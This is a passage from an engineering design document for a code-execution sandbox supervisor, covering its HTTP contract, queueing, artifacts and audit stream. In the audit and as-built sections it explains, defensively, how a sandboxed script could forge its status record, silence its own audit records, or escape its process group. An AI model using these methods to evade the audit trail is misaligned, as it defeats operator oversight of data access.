supervisor `SIGTERM`s the child's process group, `SIGKILL`s after a 2s grace, reaps, and
still answers `200` with `status: "timeout"` and whatever output was captured.
`terminationGracePeriodSeconds: 130` is 120s plus reap, answer and wipe, so that sequence
has to complete in seconds, not tens of them.

#### Concurrency: one at a time, queued, with a bounded queue and a bounded wait

**One execution at a time** (section 2's Concurrency row), and with `replicas: 1` and
`strategy: Recreate` that is the cluster-wide bound, which is what removes cross-user
co-tenancy inside the pod. A second concurrent `POST /execute` is **queued, not refused**:
measured peak is 23 chat turns/hour, so a collision is rare, and turning a rare collision
into a user-visible tool failure buys nothing.

The queue is bounded in **both** dimensions, and the bound is derived rather than picked:
a queued request holds tokens that expire at `iat + 300`, so a wait long enough to outlive
them produces a script whose every data call `401`s. **Queue depth 2 and a maximum queued
wait of 120s**, whichever binds first; beyond either the supervisor answers `429` with
`Retry-After: 60`. On **dequeue** — not on receipt — it re-checks `exp`, and answers `409`
`TokenExpired` if the wait consumed the credential. That distinction matters to the client:
`400` means "your request was wrong", `409` means "you waited too long; re-mint and retry".

**Depth 2 means at most two requests *waiting*, not counting the one executing.** So three
requests can be in flight — one running, two queued — and the fourth gets `429`. Stated
because the other reading (two total, i.e. one running plus one waiting) is equally
defensible and silently differs by one, and a client treating `/health`'s `queued < 2` as
"safe to submit" would then take `429`s it did not predict. `/health`'s `queued` uses this
same definition.

**After a `429` the client re-mints, and it re-mints a fresh `execution_id` too**, not just
fresh tokens: the refused request never reached a fork (see the duplicate-id rule below, and
the directory is created at dequeue, so a `429` leaves nothing behind), and reusing the id
would collide with that rule the moment the earlier attempt did run.

**`409 TokenExpired` is a defensive check and is not expected to fire, and an earlier draft
justified it wrongly.** That draft said the `429` retry was "the only route by which it is
reachable at all", which does not follow from its own numbers: the retry re-mints, and the
maximum queued wait (120s) is far below the 300s TTL, so a freshly minted pair cannot expire
in the queue. What can actually reach it is a token pair that was **not** freshly minted —
`mint_execution_tokens` takes an optional `execution_id=`, so a caller can resubmit an older
pair — or clock skew between the minter and the supervisor large enough to matter. Both are
caller-side faults worth a distinct status, and the check stays; a client should handle it
without treating it as routine.

**A repeated `execution_id` is refused: `409` with `error.type: "DuplicateExecutionId"`**,
whenever `/scratch/<execution-id>` already exists — a live execution or a completed one still
inside its 15-minute artifact retention. After retention expires the id is reusable, which is
harmless because nothing then refers to it. This is a normal event, not a client bug, which
is why it has a specified outcome rather than being left to the implementer: the `429` retry
path, the 15-minute retention and `mint_execution_tokens`' optional `execution_id=` (section
4, "As built") together make a resubmission with the same id easy to write by accident.
Refusing is the only one of the three plausible behaviours that preserves the invariant
everything downstream keys on — one `execution_id` names exactly one directory, one manifest
and one audit trail. Reusing the directory would merge two runs' artifacts into a manifest
chat-backend has already recorded, and wiping and re-running would delete artifacts
`read_artifact` may still be serving from the first run; both leave the `jti`/`sid` join
`4h6.52`'s sid-scoped retrieval will build on pointing at content that is not what was
recorded.

**The maximum wait — not the depth — is the number the token lifetime constrains.** The
inequality is `max wait + timeout_s < 300`: 120 + 120 = 240 against the real 300s TTL
(section 4). Depth does not appear in it, and raising the depth lengthens the queue without
lengthening any individual wait, because the wait bound cuts first. Anyone raising the
**wait** above 180s is the one who breaks it, and gets a script whose data calls `401`
mid-run. Note also that the 60s of slack this leaves is not free headroom: section 4
justifies the 300s TTL partly by "a slow BigQuery job started at the last moment" plus clock
skew, and an execution that waited the full 120s and then ran the full 120s has ~60s of token
life left for that last-moment call rather than the ~180s section 4's reasoning assumes — so
the wait bound trades directly against section 4's margin.

**When the client goes away, the supervisor's behaviour depends on whether the child has
been forked.** The contract tells the client to set its own deadline *above* **the maximum
queued wait plus `timeout_s`**, so the ordinary case is that it waits; but chat-backend
restarts, and a connection can drop. Two rules:

**That deadline is 240s at `timeout_s: 120`, not 120s, and an earlier draft of this
subsection said "above the 120s ceiling" twice.** It was wrong in the direction that
produces a live interop bug, which is why it is called out rather than quietly fixed: the
supervisor may hold a request for the full 120s queued wait **and then** run it for the full
`timeout_s`, so a client that read that sentence literally and picked, say, 150s times out
on an execution the supervisor is about to answer — and because a running child is
deliberately not killed on disconnect, that client's retry then queues behind the child it
abandoned. `4h6.47` implemented `max queued wait + timeout_s + margin` (255s at
`timeout_s: 120`), which is the correct reading.

- **A queued request whose connection has closed is dropped at dequeue and never forked.**
  Nobody is waiting for the response, and running it would spend the pod's only slot and up
  to 120s of a credential nobody will use — while the client's retry queues behind it. The
  check is cheap and is made at dequeue, where the `exp` re-check already happens.
- **A running child is *not* killed on disconnect. It runs to completion**, is reaped, its
  manifest is written and its artifacts are retained for the usual 15 minutes; the response
  it can no longer deliver is discarded. Killing it would destroy artifacts the retention
  window promises and that a rerun may not reproduce, and peer-disconnect detection while
  the supervisor is not reading the socket is unreliable enough that a false positive would
  kill live executions. The slot is held for at most `timeout_s`, i.e. ≤ 120s, which is the
  same bound the queue's max wait is derived against — an abandoned child cannot starve the
  queue for longer than a healthy one.

A chat-backend restart mid-execution is exactly this case and needs no separate handling: the
old response is undeliverable, the artifacts survive their retention window, and the retry
arrives with a **fresh** `execution_id` (per the duplicate rule above) and queues normally. A
`SIGTERM` to the *supervisor* is the other direction and is already specified: it stops
accepting (`503 NotReady`) and lets the in-flight child finish inside the 130s grace.

#### `POST /execute` — response

**It does not stream. One request, one response, returned once, after the child has been
reaped.** Stated plainly because "stream stdout" (`4h6.42`) refers to the supervisor reading the child's pipe incrementally — which it must, to enforce
the 8 MiB pipe cap — not to a streaming HTTP response. Three reasons the response cannot
stream: the 64 KiB head-and-tail cap is uncomputable until the stream ends, because the tail
is unknown until then; the artifact manifest and the error object are only knowable at the
end, so a streaming body would put them after an unbounded prefix that every client must
buffer anyway; and the model consumes the whole result in one turn regardless.

**`200` means the supervisor ran the script and is reporting what happened — including a
script that raised, timed out or was killed.** A failing script is not an HTTP failure.
Non-2xx is reserved for the supervisor refusing or being unable to run it at all.

| field | type | notes |
|---|---|---|
| `execution_id` | string | echo of the request value |
| `status` | `"ok"` \| `"error"` \| `"timeout"` \| `"limit"` | `ok` = child exited 0; `error` = non-zero exit or an uncaught exception; `timeout` = wall clock fired; `limit` = a supervisor-enforced limit fired |
| `exit_code` | integer or `null` | `null` when the child was killed by a signal or never started |
| `signal` | integer or `null` | `null` when it exited normally. Kept separate from `exit_code` rather than folded into `128+n`, which loses which of the two happened |
| `duration_ms` | integer | child wall clock, fork to reap; excludes queue wait |
| `output` | string, always present, `""` if none | see below |
| `output_bytes` | integer | total bytes read from the child's pipe before capping, up to the 8 MiB pipe cap |
| `output_truncated` | boolean | true iff `output` is elided or the pipe cap fired |
| `error` | object or `null` | present iff `status != "ok"`; see below |
| `artifacts` | array of objects, always present, `[]` if none | the manifest; see below |
| `artifacts_omitted` | integer ≥ 0 | files present in the artifacts directory that could not be listed retrievably; see below |

The response carries **no token, no filesystem path, no environment and no host name**.

**`output` is stdout and stderr interleaved, as the child wrote them.** Section 2 budgets
**one** 64 KiB window (first 32 KiB + last 32 KiB) for what reaches the model, and the
traceback the model needs is at the tail. Splitting that budget across two fields either
halves the head-and-tail window or quietly doubles section 2's number, so the child gets one
pipe and this contract returns one string. The SDK's audit records are **not** in it — they
go to the dedicated fd described below. Naming the field `output` rather than `stdout` is
deliberate: a field called `stdout` that also carries stderr is a trap for whoever reads
this document next.

**Capping and elision.** Capping is applied to **bytes**, head 32 KiB + tail 32 KiB, with the
literal marker `\n...[<N> bytes elided]...\n` between them, where `<N>` is the decimal count
of bytes dropped. The marker is fixed text so a client can recognise it without heuristics.
The 64 KiB budget is the head and the tail **only — the marker is additional**, so a fully
elided `output` encodes to 65536 bytes plus the marker's ~30. Head and tail are exactly
32 KiB each rather than 32 KiB minus half a marker, because the alternative makes the two
ends' arithmetic depend on the decimal width of `<N>`.

**The 8 MiB pipe cap kills the child, and it is a `limit`, not an `ok`.** Section 2's Output
cap row says the reader stops at 8 MiB from the pipe *and kills the child*; this is what that
looks like on the wire, stated because a supervisor that instead drained and discarded the
excess would answer `200 status:"ok" error:null` and silently violate section 2 — the whole
point of the cap is that the supervisor's memory and the pod's CPU stop being consumed, which
draining does not achieve. On the cap firing the supervisor `SIGTERM`s the child's process
group, `SIGKILL`s after the same 2s grace as the timeout path, reaps, and answers **`200`**
with `status: "limit"`, `error.type: "OutputLimit"`, `error.limit: "OutputLimit"` and
`output_truncated: true`. `exit_code` and `signal` report how the child actually ended —
normally `exit_code: null` with `signal` 15 or 9 depending on whether the grace expired, but
a child that traps `SIGTERM` and exits reports its `exit_code` with `signal: null` instead.
`status` is `"limit"` in every one of those cases: it records that the supervisor's limit
fired, not how the process happened to die.

**Output that is not valid UTF-8 is decoded lossily, and there is no alternate encoding.**
The head/tail split cuts on byte boundaries and can bisect a multi-byte sequence, and a
script can print arbitrary bytes in any case. The supervisor decodes with
`errors="replace"`, so invalid bytes become U+FFFD and `output` is always a valid JSON
string. **No base64, no `encoding` field**, because a client that has to branch on encoding
will eventually get the branch wrong, and the model cannot read base64 usefully anyway. A
script with binary to return writes an **artifact**; `read_artifact` already returns base64
with an explicit `encoding` field for exactly that case (section 6).

**The `error` object.**

| field | type | notes |
|---|---|---|
| `type` | string, **open** | the child's exception class name (`ValueError`), or one of the supervisor's own reserved names: `Timeout`, `PidLimit`, `ArtifactQuota`, `ScratchQuota`, `OutputLimit`, `NonZeroExit`, `Killed`, `StartupFailure` |
| `message` | string, ≤ 2 KiB | truncated, never omitted |
| `traceback` | string or `null`, tail-capped at 8 KiB | `null` when the end was not an exception |
| `limit` | string or `null` | which limit fired, when `status == "limit"`; the same vocabulary as `type` |

**`type` is an open string, and the listed names are a reserved minimum.** It cannot be a
closed enum, because half its range is the child's exception class name and the child imports
whatever it likes. So: the supervisor's own names above are reserved — it emits no others for
those conditions and a client may branch on them — and every other value is an opaque label
to display, never to switch on. This is the one place the subsection's "a field not listed
here does not exist" rule does not extend to values: it constrains the set of *fields*, not
the set of strings a `type` may hold.

**Memory exhaustion has no reserved name, and `MemoryLimit` is not one of the eight above.**
The name exists in `sandbox/supervisor.py` as `ERR_MEMORY_LIMIT` and an earlier version of this
table listed it, but nothing has ever emitted it and nothing can: the memory ceiling is
`RLIMIT_AS`, which the **child** applies to itself and the kernel enforces inside the child, so
the supervisor never sees a limit fire. What comes back is the child's own exception class —
`status: "error"`, `error.type: "MemoryError"`, `error.limit: null` — on the *open* half of the
range, which is what a client must match. The supervisor cannot re-label it: doing so would
mean trusting the child to tell the ceiling apart from a plain `raise MemoryError`, and
refusing exactly that trust is what the reserved set is for. `ERR_MEMORY_LIMIT` therefore stays
in the supervisor's reserved set — where its only remaining job is to stop a script forging the
name — and is deliberately absent from both `_LIMIT_MESSAGES` and this table. A client branch
keyed on `"MemoryLimit"` is dead code; `genetics-mcp-server`'s `_analysis_hint` has one, and it
is doubly unreachable because it sits under `status == "limit"`, which a `MemoryError` never
produces.

**`NonZeroExit` is the name for a child that exited non-zero without an uncaught exception**
— `sys.exit(3)`, a C extension calling `exit()`, a subprocess convention. The `status` table
already makes that a `status: "error"` case, and without a reserved name for it every
supervisor would invent its own (`ExitCode`, `Error`, the number itself). `exit_code` carries
the number; `traceback` is `null`.

**Unsettled, and deliberately not invented here:** *how* the child reports its exception type
and traceback to the supervisor — a structured final record on a dedicated fd, versus the
supervisor parsing the tail of `output` — is `4h6.39`'s to settle. This contract fixes only
the shape the supervisor emits. A supervisor that can only observe an exit status and a byte
stream may legitimately report `type: "Killed"` with `traceback: null`; a client must
tolerate that and must not parse `message` for meaning.

#### The artifact manifest

One entry per retrievable file, and **the shape is dictated by what `read_artifact` can
actually consume** (`4h6.15`, `ToolExecutor.read_artifact` in
`genetics-mcp-server/src/genetics_mcp_server/tools/executor.py`). That function takes a
**bare name** and resolves it against `SANDBOX_ARTIFACTS_DIR`; it rejects separators,
backslashes, `.`/`..`, absolute paths, NUL and anything where `Path(name).name != name`
*before* touching the filesystem, refuses a symlinked artifacts directory, requires the
resolved directory to sit under a hardcoded `/scratch/` prefix, opens that directory with
`O_DIRECTORY|O_NOFOLLOW` and verifies **the descriptor** through `/proc/self/fd`, then opens
the file relative to that descriptor with `O_NOFOLLOW|O_NONBLOCK` and refuses anything that
is not a regular file with `st_nlink == 1`.

| field | type | notes |
|---|---|---|
| `name` | string | the **bare** file name, e.g. `"manhattan.png"` |
| `size` | integer | bytes, from the supervisor's `fstat` at manifest time |
| `content_type` | string | from the **name** only |

**No paths. No execution id. No URL.** An entry carrying any of those would name something
`read_artifact` refuses by construction, and an execution id in the manifest would invite a
model-supplied one back in — which section 6 rules out precisely because the id is
unguessable but not confidential.

The supervisor lists a file **only if it would survive that read**, which means all of:

- a **regular file directly in** `/scratch/<execution-id>/artifacts` — no recursion into
  subdirectories (their contents are unnameable by a bare name), no symlinks, no FIFOs,
  sockets or devices;
- `st_nlink == 1`;
- a name that passes `read_artifact`'s own rules, and additionally is valid UTF-8, has **no
  leading or trailing whitespace**, and has no control characters — a name the supervisor
  cannot render is a name the model cannot ask for, and a name containing a newline would
  forge a line break in the audit stream. The whitespace rule is not cosmetic: `executor.py`
  does `name = name.strip()` **before** validating, so `"plot.png "` passes every other rule
  on this list, gets listed, and is then unretrievable — the read strips it, looks up
  `plot.png`, and returns the same indistinguishable "Artifact not found" the model gets for
  a name that was never there. A manifest must never advertise a name the read cannot open.

Anything failing those is **omitted and counted in `artifacts_omitted`**, never listed with a
mangled name and never silently dropped: a nonzero count tells an operator something is
there without disclosing an attacker-chosen string. Files **over `read_artifact`'s 4 MiB read
limit are still listed** with their true size — the refusal that follows tells the model to
write a smaller summary, which is more useful than the file appearing not to exist. Note
these are three separate numbers and none of them is the others: the 4 MiB per-read limit,
the 64Mi per-execution artifact quota, and the 512Mi `emptyDir` `sizeLimit` the supervisor's
sub-quotas must keep the kubelet away from.

`content_type` is derived from the name (`mimetypes.guess_type`, falling back to
`application/octet-stream`) and **must not** be sniffed from content: `read_artifact`
recomputes it the same way at read time, and the two answers have to agree. Entries are
sorted by `name`.

**`size` is the one field that legitimately differs between the two.** The manifest's is the
supervisor's `fstat` at manifest time; `read_artifact` returns `len(raw)` from its own read,
minutes later. They disagree only if something rewrote the file after the execution ended,
which nothing in the design does — but the two numbers are produced by different code at
different times, so a client must not assert they are equal, and a mismatch is not a security
event. It is noted here only so nobody adds that assertion later and gets a flaky failure.

`/scratch/<execution-id>/artifacts` is retained 15 minutes after completion and everything
else under the directory goes immediately (section 6). The manifest is what chat-backend
records against the `jti` and `sid` so that `read_artifact` resolves a name server-side.

#### `GET /artifact` — one file back out, for images only

The third route, added by `genetics-results-suite-8z1`. It is **the retrieval half of
`4h6.52` and does not close it**: `4h6.52` also owes the sid-scoped resolution that would let
the *model* ask for an arbitrary artifact by name, and that half is still open. Nothing the
model can call reaches this route.

```
GET /artifact?execution_id=<uuid4>&name=<bare name>
```

```json
{ "execution_id": "…", "name": "manhattan.png", "content_type": "image/png",
  "size": 20481, "content_base64": "iVBORw0KGgo…" }
```

**Who may read what.** The `execution_id` **is** the authorisation. It is a uuid4 minted per
execution by chat-backend, equal to the tokens' `jti` (the supervisor refuses a request where
they differ), and it is never rendered to the model — `_render_analysis` strips it from
everything the model sees, which is the same property that lets the manifest carry no id. So
the only caller that can name an execution is the one that submitted it. Combined with the
NetworkPolicy that decides who reaches port 8080 at all, that is exactly the standing
`/execute` has; this route adds no new trust assumption, only a new thing to read.

**Retained executions only.** A running execution is not served: its bytes are still moving
and a half-written PNG is worse than a 404. By the time the submitter has the id in a
response, the execution is over and `_retain` has trimmed the directory. `404 NotFound` is
returned identically for "never existed", "still running" and "already reaped" — which of the
three it is would tell a caller holding a guessed id something about the pod's state.

**The checks run inside the sandbox**, against the directory the child actually wrote to,
which is the entire reason this is an HTTP route rather than chat-backend opening a path.
`read_artifact_bytes` applies `build_manifest`'s checks in the same order —
`_name_is_retrievable`, `O_RDONLY|O_DIRECTORY|O_NOFOLLOW` on the directory, the file opened
**relative to that descriptor** with `O_NOFOLLOW`, regular file with `st_nlink == 1` — so
nothing the manifest advertised is unretrievable and nothing it withheld becomes reachable by
asking directly.

| condition | status | `error.type` |
|---|---|---|
| served | 200 | — |
| `execution_id` not a lowercase uuid4, or `name` fails `_name_is_retrievable` | 400 | `InvalidRequest` |
| no such retained execution, or no such file, or not a regular file | 404 | `NotFound` |
| file larger than `ARTIFACT_READ_MAX_BYTES` (512 KiB) | 413 | `ArtifactTooLarge` |

The 512 KiB cap is set against `MAX_RESPONSE_BYTES` (1 MiB), not against what a plot needs:
base64 is +33% inside a JSON envelope, so 512 KiB of file is ~700 KiB of body and stays clear.
Letting `_cap_response` fire instead would answer "response too large", which reads as a
supervisor fault; a 413 names the real reason. A matplotlib PNG at the SDK's default dpi is a
few tens of KiB. **This is a fourth number** and is not the manifest's 4 MiB `read_artifact`
limit, the 64Mi per-execution artifact quota, or the 512Mi `emptyDir` `sizeLimit`.

**What chat-backend does with it.** After a `status: ok` execution, `_fetch_analysis_images`
fetches at most **four** artifacts whose manifest `content_type` starts with `image/` and
whose listed size is under the cap, and attaches them to the tool result under `images`.
`llm_service` then streams each as an `image` SSE chunk and **strips `images` from the dict
before it is serialised into the `tool_result`** — base64 in the model's context is tokens
paid for a thing the model cannot see. Nothing else in `artifacts/` is fetched; the
`artifacts_note` still tells the model to print what it needs to read. `fetch_artifact` never
raises: every refusal above, plus an unreachable sandbox, means "there is no picture", and
losing the analysis to save the figure would be the wrong trade.

#### What the supervisor owes beyond the request and the response

**The audit stream (built — `4h6.45`).** `4h6.12` handed over a written specification rather
than a puzzle, and it is an obligation of this contract even though it is not a field in it.
The supervisor holds the **read** end of the child's audit fd (`GENETICS_SDK_AUDIT_FD`) and:

- applies the rate, byte and per-line caps **on the read end**, where the child cannot reach
  them — every in-process bound was defeated by running it, because the audited code and the
  emitter share an address space;
- treats the child's framing as **untrusted input**, re-parsing and re-framing before
  anything is recorded;
- **stamps `[user=…] [session=…] [execution=…]` from the tokens' `sub`, `sid` and `jti`** —
  from the credential it holds, never from the body's `user`/`session_id` (which are only
  checked against the claims) and never by asking the child. The prefix the SDK renders from
  the child's own environment is **discarded**, not merged;
- forwards the re-framed records to the **pod's own stdout**, the only stream the cluster's
  logging agent collects. In the local Docker backend that is the container's stdout —
  identical code, different collector, and the one place the deployment difference shows up
  in behaviour rather than in configuration.

Consequence for the client: **the response body carries no audit records and must not be
expected to.** The trail leaves out of band, and a client that reads only the response learns
nothing about what the script read.

**What the read-end caps do and do not buy**, because the opposite reading is the one that
gets cited later. They bound the stream and they cannot be reset from the child: the byte
budget and the token bucket live in the supervisor, one instance per execution, so a flooding
script spends **its own** budget and cannot silence the next execution's records — a
process-global budget here would have rebuilt `4h6.12`'s suppression primitive one level up.
What they do not do is stop a child denying attribution of **its own** later calls by flooding
its own pipe; no read-end control can, because the flood and the records share one channel.
What is guaranteed instead is narrower, and the narrowness is the point: every drop the
*supervisor* makes announces itself once, in supervisor framing, and is counted in the summary
line every execution emits (`records=… dropped_rate=… dropped_oversize=… dropped_unparseable=…
dropped_over_budget=… bytes=…`) whether or not anything was dropped — so a **supervisor-side**
drop is a different line from an execution that produced no records.

**It is not distinguishable from child-side suppression, and no read-end control can make it
so.** A script that disables the SDK's logger, drops its level, installs a filter, removes the
handler (`4h6.12` measured all four, and they are still listed under "No IN-PROCESS mechanism
can make these records trustworthy" below) or simply rewrites `GENETICS_SDK_AUDIT_FD` to `1`
before its first SDK call writes nothing to the fd at all, and the summary it produces is
**byte-identical** to the summary of a script that made no SDK calls: `records=0 dropped_rate=0
dropped_oversize=0 dropped_unparseable=0 dropped_over_budget=0 bytes=0`. Both are honest
statements about what that fd carried; neither is a statement about what the script did. Do not
read `records=0` as "this script made no SDK calls". Making in-process suppression observable
needs the child *contained* rather than *read* — `4h6.55` — and is not attempted here. Measured in
the real image: a child writing 2,000 records in one `write()` recorded
`records=202 dropped_rate=1798`; one writing 1.3 MB recorded `dropped_over_budget=3869` and
still exited `status: "ok"`, because past the byte budget the reader keeps reading and
discards rather than blocking the child.

**What the supervisor cannot do, so no field may imply it.** Under the decided shared-uid
model (option (b), forced — see "The uid choice") the container holds no `CAP_SETUID`,
`CAP_SETGID` or `CAP_CHOWN`, and `setuid(65533)`/`chown(65533)` were measured to return
`EPERM`. Therefore: no per-execution uid appears anywhere in this contract; `RLIMIT_NPROC` is
not a per-execution control, so the pid budget is a supervisor-side watch on the child's
process group and is not something a request can set; and the token file's protection is
read-once-and-unlink, so a request field naming a token-file mode or owner would be
meaningless. A supervisor written against option (a) fails at runtime, not at review.

#### Error responses

Every non-2xx response **except `GET /health`'s own `503`** is the same shape —
`{"execution_id": <echo or null>, "error": {"type": …, "message": …}}` — so a client parses
one object, not two. `/health` answers both `200` and `503` with its health body
(`status`/`busy`/`queued`), for the reason given under that route; it is the single
exception, and there are no others.

| status | when | `error.type` |
|---|---|---|
| `400` | unparseable JSON, unknown field, missing or malformed field, token inconsistency, `timeout_s` out of range | `InvalidRequest` and a specific subtype |
| `404` | any path other than the two | `NotFound` |
| `405` | wrong method on `/health` or `/execute` | `MethodNotAllowed` |
| `408` | request body not fully received within 10s | `RequestTimeout` |
| `409` | tokens expired while queued | `TokenExpired` |
| `409` | `execution_id` names a live or still-retained execution | `DuplicateExecutionId` |
| `413` | body over 1 MiB, or `code` over 256 KiB | `PayloadTooLarge` |
| `415` | request `Content-Type` is not `application/json` | `UnsupportedMediaType` |
| `429` | queue full or maximum queued wait exceeded; carries `Retry-After` | `Busy` |
| `500` | supervisor bug | `InternalError` |
| `503` | `POST /execute` before startup assertions pass, or while draining after `SIGTERM` | `NotReady` |

The two `409`s are distinguished by `error.type`, never by the status code, and they want
opposite responses from the client: `TokenExpired` means re-mint and retry, `DuplicateExecutionId`
means the id was already spent and the retry needs a fresh one.

`400` and `500` bodies **never echo the request payload and never carry a filesystem path or
a traceback** — the caller supplied the payload and the paths are the sandbox's own. A `503`
must be distinguishable by the client from a script failure: `strategy: Recreate` plus
`terminationGracePeriodSeconds: 130` means a deploy landing on an in-flight execution leaves
no sandbox for up to ~130s, and that must surface as "sandbox unavailable", not as "your
analysis failed" (`4h6.47`).

### As built (`4h6.39`) — the supervisor skeleton, and how its five holes were closed

`sandbox/supervisor.py` implements the contract above: the HTTP front door, the queue, the
per-execution directory and child environment, the startup assertions and the fork/reap.
`scripts/test-supervisor.py` is its offline harness — no cluster, no credentials, no image;
it runs the real supervisor in the local interpreter against a temporary `/scratch` root and
forks real children. The image now carries the file (`sandbox/Dockerfile` copies it to
`/genetics/supervisor.py`), which does **not** make the image start one: there is still no
`CMD`, `k8s/deployments/sandbox.yaml` still declares no `command`/`args`, and `deploy.sh`
still refuses to apply it. `4h6.50` clears that, last in the chain and deliberately so.

**The child is forked and never exec'd.** That is what makes `prewarm()` worth anything —
the pre-imported numpy/scipy/polars/matplotlib pages are inherited copy-on-write — and it is
also why the child closes every inherited descriptor before running a line of the script.
Without exec, PEP 446's non-inheritable default does nothing: the script would otherwise
inherit the listening socket and every other in-flight client connection, and could read or
write another user's HTTP conversation.

**The one thing the contract left to this task is settled: a dedicated status pipe.** The
child writes at most one JSON object (`type`, `message`, `traceback`) on a fixed descriptor
and nothing else; the supervisor never parses `output` for meaning. Two reasons. The
traceback lives at the tail of `output`, which is exactly what the 64 KiB head-and-tail cap
elides on a chatty script; and a script can print whatever it likes, so parsing stdout lets
the script forge its own error object. What arrives on the pipe is still **untrusted input**
— the same process writes it — so the supervisor re-caps `message` and `traceback` and
treats a malformed record as absent. A child that is killed writes nothing, which is the
`type: "Killed"`, `traceback: null` case the contract already tells clients to tolerate.

**The status pipe narrows the forgery it replaces; it does not close it, so the
supervisor's own observation wins.** The child is forked and not exec'd, so the script runs
with that descriptor open and writable: `os.write(3, b'{"type": "ValueError", …}')` followed
by a clean exit produced `status: "error"` with `exit_code: 0` — a row the status table below
declares impossible — until the supervisor was made to **ignore any status record when the
child exited 0 and was not signalled**. An uncaught exception always leaves a non-zero exit,
so no legitimate record is lost. This matters beyond tidiness: the client returns the body
unchanged, so a forged record tells the model its own successful analysis failed, and the
code that writes it is model-influenceable by the prompt-injection path in §6.4.

**This section was written when five behaviours were missing. All five have since landed** —
`4h6.41` (wall clock, `RLIMIT_AS`, `oom_score_adj`, pid policing), `4h6.42` (the two output
bounds), `4h6.43` (token delivery), `4h6.45` (the audit stream) and `4h6.46` (quotas,
retention, reaper); see "As built" below for what each of them actually does and what it
measurably does not.

`4h6.45` could not be a drop-in and was not: a descriptor reaches the child only by existing
before the fork, so it edits `_execute_inner` (create the pipe pre-fork, drain the read end on
a third thread sharing the same reaped-child deadline the other two use), `_child_main` (dup
it onto `CHILD_AUDIT_FD` and add that number to the `_close_inherited_fds` keep-set — a number
missing from that set is closed a few lines later and every SDK record raises inside a
successful data call) and `child_env` (export `GENETICS_SDK_AUDIT_FD`).

The lossy UTF-8 decode of `output` **is** contract behaviour and is implemented: invalid
bytes become U+FFFD, and there is no alternate encoding and no `encoding` field.

**Where the contract was silent, and what was chosen.** Each of these is a place two
implementers would each pick something reasonable, so they are written down rather than left
in the code:

- **The socket binds before the startup work runs**, so `status: "starting"` is observable
  rather than theoretical: a probe arriving during `prewarm()` gets the contract's `503` with
  a health body instead of a connection refusal. Nothing can be executed while not ready —
  `/execute` answers `503 NotReady` — so this widens what is *visible*, not what is allowed,
  and a failed assertion still exits non-zero and crash-loops the pod.
- **`Content-Type` is parsed as a media type and its parameters are ignored**, per the
  Transport paragraph above; `scripts/test-supervisor.py` locks bare, charset-bearing and
  oddly-cased forms so nobody replaces it with a string compare.
- **A chunked request body is refused (`400`).** A body with no `Content-Length` cannot be
  size-capped before it is read, which is the one thing the 1 MiB cap exists to do. The
  contract assumes a length, and every client of it is a JSON POST that has one.
- **The duplicate-`execution_id` check is made twice, not once.** The contract phrases the
  rule as "`/scratch/<execution-id>` already exists", but the directory is created at
  dequeue, so two identical ids sitting in the queue would both pass a filesystem test. The
  supervisor therefore refuses at **accept** against the union of queued, running and
  retained ids *and* the filesystem, and again at **dequeue** by creating the directory with
  `mkdir` and treating `EEXIST` as the same `409`. That is a superset of the stated rule and
  preserves the same invariant.
- **The execution ends when the child is reaped, not when its pipes close.** The write ends
  of the output and status pipes are inherited by every descendant, so a grandchild that
  `setsid()`s away holds them open after the direct child exits and EOF never comes. Reading
  to EOF therefore held the execution slot on a *pipe read* rather than on a process:
  measured, `/health` reported `busy: true, queued: 0` with nothing running, the response
  never arrived, and a second user waited 36 s behind a child that had lived ~10 ms. The
  drain now gets a deadline — `DRAIN_GRACE_S` (2 s) after `waitpid` returns — and the
  supervisor closes the read ends itself and logs the abandonment; `duration_ms` is taken at
  the reap, so it measures the child and not the drain. This is **not** something the
  `4h6.41` wall clock fixes, and `4h6.41` landing has not changed that: an escapee has left
  the process group, so `killpg` returns `ESRCH` and there is nothing group-shaped left to
  kill. **Nothing in the supervisor kills such a process** — `4h6.55` owns that — and what
  this guarantees is only that it cannot block the queue.
- **`aud` may be a single-element list.** Some minters emit `aud` that way; a one-element
  list carrying the right value is the same claim. Anything else is a `400`.
- **The child's working directory is `/scratch/<id>/tmp`.** `WORKDIR` is `/genetics` on a
  read-only root, so a script writing a relative path would fail there; pointing it at the
  artifacts directory instead would silently promote every scratch file the script writes
  into the manifest.
- **`SANDBOX_USER`, `SANDBOX_SESSION_ID` and `SANDBOX_EXECUTION_ID` are set in the child**
  from the tokens' `sub`/`sid`/`jti`, and **they are not what attributes a collected record.**
  The child owns its environment and can rewrite all three between two SDK calls, so `4h6.45`
  discards the prefix the SDK renders from them and re-stamps from the claims on the read end.
  They are still set: the SDK renders the line, the shipped stubs document them, and an
  in-process (non-sandbox) host has no supervisor to stamp anything. **The environment prefix
  and the signed claims are not the same evidence**, and only the second one survives to a
  collector.
- **The startup wipe removes everything under `/scratch` except the supervisor's own
  directory.** After a restart the supervisor holds no record of what was live or retained —
  that state is in memory and does not survive the process — so nothing under `/scratch`
  belongs to a live or still-retained execution by the definition the rule uses. Wiping is
  the conservative reading and the one the rule exists for: a crash mid-execution must not
  leave a readable directory behind.
- **The supervisor keeps one writable `MPLCONFIGDIR` of its own** at
  `/scratch/.supervisor/mplconfig`, seeded from `$GENETICS_MPLCACHE`, purely so `prewarm()`
  can import `matplotlib.pyplot` at startup. It is not shared with any child — every
  execution still gets its own, seeded the same way — and the startup wipe keeps it by name.

**No setuid, no chown, and none is attempted.** Option (b) is the shipped model: supervisor
and child share uid 65532. Per-execution directories are `0700` and the child sets
`umask(0o077)`; under one uid those modes keep everything else out and do nothing between
the two processes, which is why the token file's protection has to be lifetime (`4h6.43`)
and the pid budget has to be a supervisor-side watch (`4h6.41`).

**What differs when the supervisor runs outside the image.** Every one of these is keyed on
an environment variable `sandbox/Dockerfile` always sets, so "unset" means "not the image"
and produces a loud warning rather than a silent behaviour change:

- **`GENETICS_PREWARM` unset → `prewarm()` is skipped**, with a warning. In the image it is
  always set, so `PrewarmError` crashes the pod exactly as the handoff table requires; on a
  developer machine without numpy/scipy/polars/matplotlib installed the supervisor would
  otherwise be unstartable.
- **`GENETICS_MPLCACHE` unset → `MPLCONFIGDIR` starts empty** and matplotlib rebuilds its
  font cache per execution (seconds), instead of the copy being free.
- **`SANDBOX_SCRATCH_ROOT` set → the `/scratch` root moves.** Test-only, and warned about in
  those words: `read_artifact` refuses any artifacts directory that does not resolve under a
  **hardcoded** `/scratch/` prefix (`4h6.15`), so artifacts written under an overridden root
  are unretrievable by construction. The image never sets it.
- The `/etc/nsswitch.conf` assertion is **not** relaxed anywhere. It passes on an ordinary
  Linux developer machine and failing it is the intended outcome elsewhere.

### As built (`4h6.40`) — the local Docker backend, and the six things it does not reproduce

